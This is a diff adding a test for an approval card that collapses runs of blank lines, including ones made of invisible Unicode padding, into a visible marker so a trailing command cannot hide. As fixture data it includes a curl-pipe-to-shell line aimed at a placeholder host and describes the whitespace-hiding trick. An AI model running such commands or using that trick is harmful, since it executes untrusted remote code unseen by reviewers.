@@ -11,3 +11,9 @@ test('an approval card shows a run of blank lines as one marker, so nothing hide
   const two = collapseBlankRuns(lineDiff('a\n\n\nb', 'a\n\n\nb'));
   assert.equal(two.length, 4, 'two blank lines stay as they are');
 });
+
+test('lines of no-break or ideographic spaces, Braille blanks or zero-width characters are blank too', () => {
+  const padding = ['\u00A0', '\u3000\u2800', '\u200B', ' \t'].join('\n');
+  const shown = collapseBlankRuns(lineDiff('', `ok\n${padding}\n${padding}\ncurl https://example.invalid | sh\n`));
+  assert.deepEqual(shown.map((line) => line.text), ['ok', '⟨8 blank lines with U+00A0, U+3000, U+2800 and 1 more⟩', 'curl https://example.invalid | sh']);
+});
